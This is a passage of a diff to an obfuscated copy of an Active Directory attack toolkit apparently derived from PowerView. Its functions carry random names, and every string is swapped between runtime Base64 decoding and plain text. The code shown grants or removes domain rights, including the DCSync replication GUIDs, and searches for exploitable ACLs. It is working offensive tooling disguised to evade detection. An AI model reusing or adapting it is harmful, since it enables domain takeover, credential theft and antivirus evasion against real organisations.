-            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uZQ==")))
-            $ControlType = [System.Security.AccessControl.AccessControlType] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3c=")))
+            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
+            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
             $ACEs = @()
 
             if ($RightsGUID) {
@@ -5186,19 +5190,19 @@ function sixayy {
             else {
                 $GUIDs = Switch ($Rights) {
                     
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzZXRQYXNzd29yZA=="))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MDAyOTk1NzAtMjQ2ZC0xMWQwLWE3NjgtMDBhYTAwNmUwNTI5"))) }
+                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                     
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVNZW1iZXJz"))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmY5Njc5YzAtMGRlNi0xMWQwLWEyODUtMDBhYTAwMzA0OWUy"))) }
-                    
-                    
+                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                     
                     
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RENTeW5j"))) { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MTEzMWY2YWEtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2Qy"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MTEzMWY2YWQtOWMwNy0xMWQxLWY3OWYtMDBjMDRmYzJkY2Qy"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ODllOTViNzYtNDQ0ZC00YzYyLTk5MWEtMGZhY2JlZGE2NDBj")))}
+                    
+                    
+                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                 }
             }
 
             ForEach ($PrincipalObject in $Principals) {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlbW92ZS1Eb21haW5PYmplY3RBY2xdIFJlbW92aW5nIHByaW5jaXBhbCB7MH0gJyRSaWdodHMnIGZyb20gezF9"))) -f $($PrincipalObject.distinguishedname), $($TargetObject.Properties.distinguishedname))
+                Write-Verbose ("[Remove-DomainObjectAcl] Removing principal {0} '$Rights' from {1}" -f $($PrincipalObject.distinguishedname), $($TargetObject.Properties.distinguishedname))
 
                 try {
                     $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)
@@ -5206,27 +5210,27 @@ function sixayy {
                     if ($GUIDs) {
                         ForEach ($GUID in $GUIDs) {
                             $NewGUID = New-Object Guid $GUID
-                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXh0ZW5kZWRSaWdodA==")))
+                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                             $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                         }
                     }
                     else {
                         
-                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY0FsbA==")))
+                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                         $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                     }
 
                     
                     ForEach ($ACE in $ACEs) {
-                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlbW92ZS1Eb21haW5PYmplY3RBY2xdIEdyYW50aW5nIHByaW5jaXBhbCB7MH0gcmlnaHRzIEdVSUQgJ3sxfScgb24gezJ9"))) -f $($PrincipalObject.distinguishedname), $($ACE.ObjectType), $($TargetObject.Properties.distinguishedname))
+                        Write-Verbose ("[Remove-DomainObjectAcl] Granting principal {0} rights GUID '{1}' on {2}" -f $($PrincipalObject.distinguishedname), $($ACE.ObjectType), $($TargetObject.Properties.distinguishedname))
                         $TargetEntry = $TargetObject.GetDirectoryEntry()
-                        $TargetEntry.PsBase.Options.SecurityMasks = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGFjbA==")))
+                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                         $TargetEntry.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                         $TargetEntry.PsBase.CommitChanges()
                     }
                 }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlbW92ZS1Eb21haW5PYmplY3RBY2xdIEVycm9yIHJlbW92aW5nIHByaW5jaXBhbCB7MH0gJyRSaWdodHMnIGZyb20gezF9IDogezJ9"))) -f $($PrincipalObject.distinguishedname), $($TargetObject.Properties.distinguishedname), $_)
+                    Write-Verbose ("[Remove-DomainObjectAcl] Error removing principal {0} '$Rights' from {1} : {2}" -f $($PrincipalObject.distinguishedname), $($TargetObject.Properties.distinguishedname), $_)
                 }
             }
         }
@@ -5234,7 +5238,7 @@ function sixayy {
 }
 
 
-function nnjebj {
+function hvfbse {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -5270,7 +5274,7 @@ function nnjebj {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -5290,92 +5294,92 @@ function nnjebj {
 
     BEGIN {
         $ACLArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzb2x2ZUdVSURz")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzb2x2ZUdVSURz")))] = $ResolveGUIDs }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmlnaHRzRmlsdGVy")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmlnaHRzRmlsdGVy")))] = $RightsFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['ResolveGUIDs']) { $ACLArguments['ResolveGUIDs'] = $ResolveGUIDs }
+        if ($PSBoundParameters['RightsFilter']) { $ACLArguments['RightsFilter'] = $RightsFilter }
+        if ($PSBoundParameters['LDAPFilter']) { $ACLArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $ACLArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }
 
         $ObjectSearcherArguments = @{
-            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWUsb2JqZWN0Y2xhc3M=")))
-            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3"))) = $True
+            'Properties' = 'samaccountname,objectclass'
+            'Raw' = $True
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Server']) { $ObjectSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ObjectSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ObjectSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ObjectSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ObjectSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ObjectSearcherArguments['Credential'] = $Credential }
 
         $ADNameArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
+        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
 
         
         $ResolvedSIDs = @{}
     }
 
     PROCESS {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
-            $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain
-            $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain
+        if ($PSBoundParameters['Domain']) {
+            $ACLArguments['Domain'] = $Domain
+            $ADNameArguments['Domain'] = $Domain
         }
 
-        icohnm @ACLArguments | ForEach-Object {
+        vwpfbo @ACLArguments | ForEach-Object {
 
-            if ( ($_.ActiveDirectoryRights -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY0FsbHxXcml0ZXxDcmVhdGV8RGVsZXRl")))) -or (($_.ActiveDirectoryRights -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXh0ZW5kZWRSaWdodA==")))) -and ($_.AceQualifier -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3c=")))))) {
+            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                 
-                if ($_.SecurityIdentifier.Value -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS01LS4qLVsxLTldXGR7Myx9JA==")))) {
+                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                     if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
                         $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass = $ResolvedSIDs[$_.SecurityIdentifier.Value]
 
                         $InterestingACL = New-Object PSObject
-                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $_.ObjectDN
-                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNlUXVhbGlmaWVy"))) $_.AceQualifier
-                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWN0aXZlRGlyZWN0b3J5UmlnaHRz"))) $_.ActiveDirectoryRights
+                        $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
+                        $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
+                        $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                         if ($_.ObjectAceType) {
-                            $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0QWNlVHlwZQ=="))) $_.ObjectAceType
+                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                         }
                         else {
-                            $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0QWNlVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uZQ==")))
+                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                         }
-                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNlRmxhZ3M="))) $_.AceFlags
-                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNlVHlwZQ=="))) $_.AceType
-                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5oZXJpdGFuY2VGbGFncw=="))) $_.InheritanceFlags
-                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlJZGVudGlmaWVy"))) $_.SecurityIdentifier
-                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VOYW1l"))) $IdentityReferenceName
-                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VEb21haW4="))) $IdentityReferenceDomain
-                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VETg=="))) $IdentityReferenceDN
-                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VDbGFzcw=="))) $IdentityReferenceClass
+                        $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
+                        $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
+                        $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
+                        $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
+                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
+                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
+                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
+                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
                         $InterestingACL
                     }
                     else {
-                        $IdentityReferenceDN = vqxllx -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
+                        $IdentityReferenceDN = jjxazw -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
                         
 
                         if ($IdentityReferenceDN) {
-                            $IdentityReferenceDomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
+                            $IdentityReferenceDomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                             
-                            $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityReferenceDomain
-                            $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $IdentityReferenceDN
+                            $ObjectSearcherArguments['Domain'] = $IdentityReferenceDomain
+                            $ObjectSearcherArguments['Identity'] = $IdentityReferenceDN
                             
-                            $Object = kzvwpf @ObjectSearcherArguments
+                            $Object = guawbd @ObjectSearcherArguments
 
                             if ($Object) {
                                 $IdentityReferenceName = $Object.Properties.samaccountname[0]
-                                if ($Object.Properties.objectclass -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y29tcHV0ZXI=")))) {
-                                    $IdentityReferenceClass = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y29tcHV0ZXI=")))
+                                if ($Object.Properties.objectclass -match 'computer') {
+                                    $IdentityReferenceClass = 'computer'
                                 }
-                                elseif ($Object.Properties.objectclass -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA=")))) {
-                                    $IdentityReferenceClass = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA=")))
+                                elseif ($Object.Properties.objectclass -match 'group') {
+                                    $IdentityReferenceClass = 'group'
                                 }
-                                elseif ($Object.Properties.objectclass -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXNlcg==")))) {
-                                    $IdentityReferenceClass = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXNlcg==")))
+                                elseif ($Object.Properties.objectclass -match 'user') {
+                                    $IdentityReferenceClass = 'user'
                                 }
                                 else {
                                     $IdentityReferenceClass = $Null
@@ -5385,28 +5389,28 @@ function nnjebj {
                                 $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass
 
                                 $InterestingACL = New-Object PSObject
-                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $_.ObjectDN
-                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNlUXVhbGlmaWVy"))) $_.AceQualifier
-                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWN0aXZlRGlyZWN0b3J5UmlnaHRz"))) $_.ActiveDirectoryRights
+                                $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
+                                $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
+                                $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                 if ($_.ObjectAceType) {
-                                    $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0QWNlVHlwZQ=="))) $_.ObjectAceType
+                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                 }
                                 else {
-                                    $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0QWNlVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uZQ==")))
+                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                                 }
-                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNlRmxhZ3M="))) $_.AceFlags
-                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNlVHlwZQ=="))) $_.AceType
-                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5oZXJpdGFuY2VGbGFncw=="))) $_.InheritanceFlags
-                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlJZGVudGlmaWVy"))) $_.SecurityIdentifier
-                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VOYW1l"))) $IdentityReferenceName
-                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VEb21haW4="))) $IdentityReferenceDomain
-                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VETg=="))) $IdentityReferenceDN
-                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VDbGFzcw=="))) $IdentityReferenceClass
+                                $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
+                                $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
+                                $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
+                                $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
+                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
+                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
+                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
+                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
                                 $InterestingACL
                             }
                         }
                         else {
-                            Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5BY2xdIFVuYWJsZSB0byBjb252ZXJ0IFNJRCAnezB9JyB0byBhIGRpc3Rpbmd1aXNoZWRuYW1lIHdpdGggQ29udmVydC1BRE5hbWU="))) -f $($_.SecurityIdentifier.Value ))
+                            Write-Warning ("[Find-InterestingDomainAcl] Unable to convert SID '{0}' to a distinguishedname with Convert-ADName" -f $($_.SecurityIdentifier.Value ))
                         }
                     }
                 }
@@ -5416,7 +5420,7 @@ function nnjebj {
 }
 
 
-function tmesuk {
+function kpvdys {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -5458,7 +5462,7 @@ function tmesuk {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -5489,17 +5493,17 @@ function tmesuk {
 
     BEGIN {
         $SearcherArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        $OUSearcher = ltdynu @SearcherArguments
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
